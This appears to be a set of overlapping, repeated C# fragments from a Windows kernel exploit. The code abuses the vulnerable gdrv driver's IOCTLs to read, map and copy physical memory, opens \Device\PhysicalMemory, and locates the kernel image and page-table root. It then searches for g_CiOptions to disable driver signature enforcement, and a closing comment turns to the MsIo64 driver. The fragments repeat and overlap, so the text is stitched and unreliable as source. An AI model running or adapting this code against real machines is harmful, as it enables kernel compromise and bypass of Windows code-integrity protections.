@@ -1,0 +1,391 @@
+=== 307: public static byte[] GdrvReadOneRaw(IntPtr h, ulong pa, int size)
+   {
+   IntPtr stage = Stage(Math.Max(size, 0x1000));
+   IntPtr inb = Marshal.AllocHGlobal(0x18);
+   try
+   {
+   Marshal.WriteInt64(inb, 0x00, (long)pa);
+   Marshal.WriteInt32(inb, 0x08, size);
+   Marshal.WriteInt32(inb, 0x0C, 0);
+   Marshal.WriteInt64(inb, 0x10, stage.ToInt64());
+   LastIssuedPa = pa; Issued++;
+   if (Notify != null)
+   Notify(string.Format("  [io] read pa=0x{0:x} size=0x{1:x}{2}", pa, size,
+   InRamSpan(pa, size) ? "" : "   <<< NOT RAM-BACKED"));
+   uint got;
+   if (!DeviceIoControl(h, 0xC3502014, inb, 0x18, IntPtr.Zero, 0, out got, IntPtr.Zero))
+   throw new Exception("read pa=0x" + pa.ToString("x") + " size=0x" + size.ToString("x")
+   + " err=" + Marshal.GetLastWin32Error());
+   byte[] res = new byte[size];
+   Marshal.Copy(stage, res, 0, size);
+   return res;
+   }
+   finally { Marshal.FreeHGlobal(inb); }
+=== 333: public static byte[] GdrvReadOne(IntPtr h, ulong pa, int size)
+   {
+   if (!InRamSpan(pa, size))
+   {
+   SkippedOutOfRam++;
+   if (Notify != null)
+   Notify(string.Format("  [io] SKIP pa=0x{0:x} size=0x{1:x} (hole/not RAM)", pa, size));
+   return new byte[size];
+   }
+   return GdrvReadOneRaw(h, pa, size);
+   }
+   
+   public static byte[] GdrvRead(IntPtr h, ulong pa, int size)
+   {
+   const int CH = 0x1000;
+   byte[] outb = new byte[size];
+   int off = 0;
+   while (off < size)
+   {
+   int n = Math.Min(CH, size - off);
+   byte[] part = GdrvReadOne(h, pa + (ulong)off, n);
+   Array.Copy(part, 0, outb, off, n);
+   off += n;
+=== 342: return GdrvReadOneRaw(h, pa, size);
+   }
+   
+   public static byte[] GdrvRead(IntPtr h, ulong pa, int size)
+   {
+   const int CH = 0x1000;
+   byte[] outb = new byte[size];
+   int off = 0;
+   while (off < size)
+   {
+   int n = Math.Min(CH, size - off);
+   byte[] part = GdrvReadOne(h, pa + (ulong)off, n);
+   Array.Copy(part, 0, outb, off, n);
+   off += n;
+   }
+   return outb;
+   }
+   
+   // Which single-call sizes does the read accept?  (falsifies the "size is
+   // capped at one page" theory instead of assuming it)
+   public static string SizeLadder(IntPtr g, ulong pa, out string rep)
+   {
+   rep = "";
+=== 345: public static byte[] GdrvRead(IntPtr h, ulong pa, int size)
+   {
+   const int CH = 0x1000;
+   byte[] outb = new byte[size];
+   int off = 0;
+   while (off < size)
+   {
+   int n = Math.Min(CH, size - off);
+   byte[] part = GdrvReadOne(h, pa + (ulong)off, n);
+   Array.Copy(part, 0, outb, off, n);
+   off += n;
+   }
+   return outb;
+   }
+   
+   // Which single-call sizes does the read accept?  (falsifies the "size is
+   // capped at one page" theory instead of assuming it)
+   public static string SizeLadder(IntPtr g, ulong pa, out string rep)
+   {
+   rep = "";
+   int[] sizes = new int[] { 0x40, 0x100, 0x800, 0x1000, 0x2000, 0x4000, 0x10000, 0x20000 };
+   int okCount = 0;
+   for (int i = 0; i < sizes.Length; i++)
+=== 353: byte[] part = GdrvReadOne(h, pa + (ulong)off, n);
+   Array.Copy(part, 0, outb, off, n);
+   off += n;
+   }
+   return outb;
+   }
+   
+   // Which single-call sizes does the read accept?  (falsifies the "size is
+   // capped at one page" theory instead of assuming it)
+   public static string SizeLadder(IntPtr g, ulong pa, out string rep)
+   {
+   rep = "";
+   int[] sizes = new int[] { 0x40, 0x100, 0x800, 0x1000, 0x2000, 0x4000, 0x10000, 0x20000 };
+   int okCount = 0;
+   for (int i = 0; i < sizes.Length; i++)
+   {
+   try
+   {
+   byte[] b = GdrvReadOneRaw(g, pa, sizes[i]);
+   rep += string.Format("  size 0x{0:x} ok (first={1:x2})\r\n", sizes[i], b[0]);
+   okCount++;
+   }
+   catch (Exception e) { rep += string.Format("  size 0x{0:x} FAIL {1}\r\n", sizes[i], e.Message); }
+=== 371: byte[] b = GdrvReadOneRaw(g, pa, sizes[i]);
+   rep += string.Format("  size 0x{0:x} ok (first={1:x2})\r\n", sizes[i], b[0]);
+   okCount++;
+   }
+   catch (Exception e) { rep += string.Format("  size 0x{0:x} FAIL {1}\r\n", sizes[i], e.Message); }
+   }
+   return okCount.ToString();
+   }
+   
+   // Is the read range limited?  dword probe every `step` bytes, errors caught.
+   public static string SweepRead(IntPtr g, ulong from, ulong to, ulong step, out string rep)
+   {
+   rep = "";
+   int okCount = 0, failCount = 0;
+   ulong firstFail = 0, lastOk = 0, lastFail = 0;
+   for (ulong pa = from; pa < to; pa += step)
+   {
+   try { RdD(g, pa); okCount++; lastOk = pa; }
+   catch (Exception)
+   {
+   failCount++; if (firstFail == 0) firstFail = pa; lastFail = pa;
+   if (failCount <= 6) rep += string.Format("  fail pa=0x{0:x}\r\n", pa);
+   }
+=== 401: public static ulong RdQ(IntPtr h, ulong pa) { return BitConverter.ToUInt64(GdrvRead(h, pa, 8), 0); }
+   public static uint RdD(IntPtr h, ulong pa) { return BitConverter.ToUInt32(GdrvRead(h, pa, 4), 0); }
+   
+   public static string Hex(byte[] b)
+   {
+   StringBuilder sb = new StringBuilder(b.Length * 3);
+   for (int i = 0; i < b.Length; i++) { sb.Append(b[i].ToString("x2")); if (i + 1 < b.Length) sb.Append(' '); }
+   return sb.ToString();
+   }
+   // ---- W1: physical R/W through \Device\PhysicalMemory (native) ----------
+   public static string PhysMemOpen(out IntPtr section)
+   {
+   section = IntPtr.Zero;
+   string p1 = EnablePriv("SeLockMemoryPrivilege");
+   string nm = @"\Device\PhysicalMemory";
+   IntPtr nameBuf = Marshal.StringToHGlobalUni(nm);
+   IntPtr usBuf = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
+   try
+   {
+   UNICODE_STRING us = new UNICODE_STRING();
+   us.Length = (ushort)(nm.Length * 2);
+   us.MaxLen = (ushort)((nm.Length + 1) * 2);
+   us.Buffer = nameBuf;
+=== 402: public static uint RdD(IntPtr h, ulong pa) { return BitConverter.ToUInt32(GdrvRead(h, pa, 4), 0); }
+   
+   public static string Hex(byte[] b)
+   {
+   StringBuilder sb = new StringBuilder(b.Length * 3);
+   for (int i = 0; i < b.Length; i++) { sb.Append(b[i].ToString("x2")); if (i + 1 < b.Length) sb.Append(' '); }
+   return sb.ToString();
+   }
+   // ---- W1: physical R/W through \Device\PhysicalMemory (native) ----------
+   public static string PhysMemOpen(out IntPtr section)
+   {
+   section = IntPtr.Zero;
+   string p1 = EnablePriv("SeLockMemoryPrivilege");
+   string nm = @"\Device\PhysicalMemory";
+   IntPtr nameBuf = Marshal.StringToHGlobalUni(nm);
+   IntPtr usBuf = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
+   try
+   {
+   UNICODE_STRING us = new UNICODE_STRING();
+   us.Length = (ushort)(nm.Length * 2);
+   us.MaxLen = (ushort)((nm.Length + 1) * 2);
+   us.Buffer = nameBuf;
+   Marshal.StructureToPtr(us, usBuf, false);
+=== 499: public static string GdrvMapTry(IntPtr h, ulong pa, ulong size, out ulong va, out uint err)
+   {
+   va = 0; err = 0;
+   IntPtr inb = Marshal.AllocHGlobal(0x20);
+   try
+   {
+   Marshal.WriteInt64(inb, 0, (long)pa);
+   Marshal.WriteInt64(inb, 8, (long)size);
+   Marshal.WriteInt64(inb, 16, 0);
+   Marshal.WriteInt64(inb, 24, 0);
+   uint got;
+   bool ok = DeviceIoControl(h, 0xC3502004, inb, 0x20, inb, 0x20, out got, IntPtr.Zero);
+   err = (uint)Marshal.GetLastWin32Error();
+   if (!ok) return string.Format("FAIL err={0} info={1}", err, got);
+   va = (ulong)Marshal.ReadInt64(inb, 0);
+   return string.Format("OK info={0} q0=0x{1:x} q1=0x{2:x}", got, va, Marshal.ReadInt64(inb, 8));
+   }
+   finally { Marshal.FreeHGlobal(inb); }
+   }
+   
+   public static string GdrvCopyTry(IntPtr h, ulong a, ulong b, uint n, out uint err)
+   {
+   err = 0;
+=== 519: public static string GdrvCopyTry(IntPtr h, ulong a, ulong b, uint n, out uint err)
+   {
+   err = 0;
+   IntPtr inb = Marshal.AllocHGlobal(0x18);
+   try
+   {
+   Marshal.WriteInt64(inb, 0, (long)b);
+   Marshal.WriteInt64(inb, 8, (long)a);
+   Marshal.WriteInt32(inb, 16, (int)n);
+   uint got;
+   bool ok = DeviceIoControl(h, 0xC3502808, inb, 0x18, inb, 0x18, out got, IntPtr.Zero);
+   err = (uint)Marshal.GetLastWin32Error();
+   return ok ? "OK" : string.Format("FAIL err={0}", err);
+   }
+   finally { Marshal.FreeHGlobal(inb); }
+   }
+   
+   public static bool CloseHandle2(IntPtr h) { return CloseHandle(h); }
+   
+   public static bool IsUserVa(ulong v)
+   {
+   if (v < 0x10000 || v >= 0x00007FFFFFFFFFFF) return false;
+   if ((v & 0xFFF) != 0) return false;
+=== 577: chunk = GdrvRead(g, pa, 0x10000);
+   for (int o = 0; o < 0x10000; o += 0x1000)
+   {
+   if (chunk[o] != 0x4D || chunk[o + 1] != 0x5A) continue;      // MZ
+   uint e_lfanew = BitConverter.ToUInt32(chunk, o + 0x3C);
+   if (e_lfanew < 0x40 || e_lfanew > 0x200) continue;
+   int pe = o + (int)e_lfanew;
+   if (pe + 0x120 > 0x10000) continue;
+   if (BitConverter.ToUInt32(chunk, pe) != 0x00004550) continue; // PE\0\0
+   if (BitConverter.ToUInt16(chunk, pe + 4) != 0x8664) continue; // amd64
+   int opt = pe + 0x18;
+   if (BitConverter.ToUInt16(chunk, opt) != 0x20B) continue;     // PE32+
+   ushort subsys = BitConverter.ToUInt16(chunk, opt + 0x44);
+   uint sizeImage = BitConverter.ToUInt32(chunk, opt + 0x38);
+   if (subsys != 10) continue;                                   // NATIVE
+   if (sizeImage < 0x400000 || sizeImage > 0x4000000) continue;
+   ulong imgPa = (pa + (ulong)o) & ~0xFFFUL;
+   string verify = ExportHas(g, imgPa, opt, 0x70, "PsLookupProcessByProcessId");
+   string line = string.Format("  native PE pa=0x{0:x} sizeOfImage=0x{1:x} preferred=0x{2:x} export[{3}]",
+   imgPa, sizeImage,
+   BitConverter.ToUInt64(chunk, opt + 0x18), verify);
+   hits += line + "\r\n";
+   if (verify == "yes") return imgPa.ToString("x");
+=== 610: byte[] d = GdrvRead(g, imgPa + (ulong)(opt + dirOff), 8);
+   uint rva = BitConverter.ToUInt32(d, 0), sz = BitConverter.ToUInt32(d, 4);
+   if (rva == 0 || sz < 0x28) return "no-dir";
+   byte[] ed = GdrvRead(g, imgPa + rva, 0x28);
+   uint count = BitConverter.ToUInt32(ed, 0x18);       // NumberOfNames
+   uint names = BitConverter.ToUInt32(ed, 0x20);       // AddressOfNames RVA
+   if (count == 0 || count > 0x2000) return "no-names";
+   byte[] tbl = GdrvRead(g, imgPa + names, (int)count * 4);
+   for (uint i = 0; i < count; i++)
+   {
+   uint nrva = BitConverter.ToUInt32(tbl, (int)i * 4);
+   byte[] nm = GdrvRead(g, imgPa + nrva, want.Length + 1);
+   bool same = true;
+   for (int k = 0; k < want.Length; k++) if (nm[k] != (byte)want[k]) { same = false; break; }
+   if (same) return "yes";
+   }
+   return "no(" + count + ")";
+   }
+   catch (Exception) { return "err"; }
+   }
+   // ---- X2: CR3 discovery via the PML4 self-reference (index 0x1ED) -------
+   // PXE_BASE = 0xFFFFF6FB7DBED000 -> PML4 index 0x1ED, and PML4[0x1ED] must
+   // point at the PML4 itself.  A candidate is only accepted when the double
+=== 613: byte[] ed = GdrvRead(g, imgPa + rva, 0x28);
+   uint count = BitConverter.ToUInt32(ed, 0x18);       // NumberOfNames
+   uint names = BitConverter.ToUInt32(ed, 0x20);       // AddressOfNames RVA
+   if (count == 0 || count > 0x2000) return "no-names";
+   byte[] tbl = GdrvRead(g, imgPa + names, (int)count * 4);
+   for (uint i = 0; i < count; i++)
+   {
+   uint nrva = BitConverter.ToUInt32(tbl, (int)i * 4);
+   byte[] nm = GdrvRead(g, imgPa + nrva, want.Length + 1);
+   bool same = true;
+   for (int k = 0; k < want.Length; k++) if (nm[k] != (byte)want[k]) { same = false; break; }
+   if (same) return "yes";
+   }
+   return "no(" + count + ")";
+   }
+   catch (Exception) { return "err"; }
+   }
+   // ---- X2: CR3 discovery via the PML4 self-reference (index 0x1ED) -------
+   // PXE_BASE = 0xFFFFF6FB7DBED000 -> PML4 index 0x1ED, and PML4[0x1ED] must
+   // point at the PML4 itself.  A candidate is only accepted when the double
+   // self-reference holds AND the kernel half of the table is populated.
+   public static string FindPml4(IntPtr g, ulong ramTop, ulong limit, out ulong cr3, out string notes)
+   {
+=== 617: byte[] tbl = GdrvRead(g, imgPa + names, (int)count * 4);
+   for (uint i = 0; i < count; i++)
+   {
+   uint nrva = BitConverter.ToUInt32(tbl, (int)i * 4);
+   byte[] nm = GdrvRead(g, imgPa + nrva, want.Length + 1);
+   bool same = true;
+   for (int k = 0; k < want.Length; k++) if (nm[k] != (byte)want[k]) { same = false; break; }
+   if (same) return "yes";
+   }
+   return "no(" + count + ")";
+   }
+   catch (Exception) { return "err"; }
+   }
+   // ---- X2: CR3 discovery via the PML4 self-reference (index 0x1ED) -------
+   // PXE_BASE = 0xFFFFF6FB7DBED000 -> PML4 index 0x1ED, and PML4[0x1ED] must
+   // point at the PML4 itself.  A candidate is only accepted when the double
+   // self-reference holds AND the kernel half of the table is populated.
+   public static string FindPml4(IntPtr g, ulong ramTop, ulong limit, out ulong cr3, out string notes)
+   {
+   cr3 = 0; notes = "";
+   ulong top = Math.Min(ramTop, limit);
+   int seen = 0;
+   for (ulong pa = 0x1000; pa + 0x1000 <= top; pa += 0x1000)
+=== 621: byte[] nm = GdrvRead(g, imgPa + nrva, want.Length + 1);
+   bool same = true;
+   for (int k = 0; k < want.Length; k++) if (nm[k] != (byte)want[k]) { same = false; break; }
+   if (same) return "yes";
+   }
+   return "no(" + count + ")";
+   }
+   catch (Exception) { return "err"; }
+   }
+   // ---- X2: CR3 discovery via the PML4 self-reference (index 0x1ED) -------
+   // PXE_BASE = 0xFFFFF6FB7DBED000 -> PML4 index 0x1ED, and PML4[0x1ED] must
+   // point at the PML4 itself.  A candidate is only accepted when the double
+   // self-reference holds AND the kernel half of the table is populated.
+   public static string FindPml4(IntPtr g, ulong ramTop, ulong limit, out ulong cr3, out string notes)
+   {
+   cr3 = 0; notes = "";
+   ulong top = Math.Min(ramTop, limit);
+   int seen = 0;
+   for (ulong pa = 0x1000; pa + 0x1000 <= top; pa += 0x1000)
+   {
+   if (!InRam(pa, ramTop)) continue;
+   ulong e = RdQ(g, pa + 0x1EDUL * 8);
+   if ((e & 1) == 0) continue;
+=== 691: byte[] hdr = GdrvRead(g, pa, 0x400);
+   if (hdr[0] != 0x4D || hdr[1] != 0x5A) continue;
+   uint e_lfanew = BitConverter.ToUInt32(hdr, 0x3C);
+   if (e_lfanew + 0x100 > 0x400) continue;
+   uint sz = BitConverter.ToUInt32(hdr, (int)e_lfanew + 0x18 + 0x38);
+   if (sz != sizeOfImage) continue;
+   vaBase = va;
+   return "1";
+   }
+   return "";
+   }
+   
+   // g_CiOptions is not exported: find the only `mov dword [rip+disp32], IMM`
+   // whose target currently holds IMM (0x0E/0x06 = DSE enabled shapes).
+   public static string FindCiOptions(IntPtr g, ulong cr3, ulong vaBase, ulong physBase,
+   uint sizeOfImage, out string report)
+   {
+   report = "";
+   int found = 0;
+   for (uint off = 0; off + 0x1000 <= sizeOfImage; off += 0x1000)
+   {
+   byte[] b = GdrvRead(g, physBase + off, 0x1000);
+   for (int i = 0; i + 10 <= 0x1000; i++)
+=== 712: byte[] b = GdrvRead(g, physBase + off, 0x1000);
+   for (int i = 0; i + 10 <= 0x1000; i++)
+   {
+   if (b[i] != 0xC7 || b[i + 1] != 0x05) continue;
+   uint imm = BitConverter.ToUInt32(b, i + 6);
+   if (imm != 0x0E && imm != 0x06 && imm != 0x02 && imm != 0x0D) continue;
+   int disp = BitConverter.ToInt32(b, i + 2);
+   ulong instrVa = vaBase + off + (ulong)i;
+   ulong targetVa = instrVa + 7 + (ulong)(long)disp;
+   ulong tpa;
+   if (!Walk(g, cr3, targetVa, out tpa)) continue;
+   uint cur = RdD(g, tpa);
+   string tag = (cur == imm) ? "  <== SELF-CONSISTENT" : "";
+   report += string.Format("  instrVa=0x{0:x} writes=0x{1:x2} -> targetVa=0x{2:x} targetPa=0x{3:x} current=0x{4:x8}{5}\r\n",
+   instrVa, imm, targetVa, tpa, cur, tag);
+   found++;
+   if (found >= 12) return found.ToString();
+   }
+   }
+   return found.ToString();
+   }
+   // MsIo64 0x80102040 with the shape implied by the unmap handler's
+   // ProbeForRead/ProbeForWrite(q1, q0, 4) pair in temp\drv\msio_1500.txt:
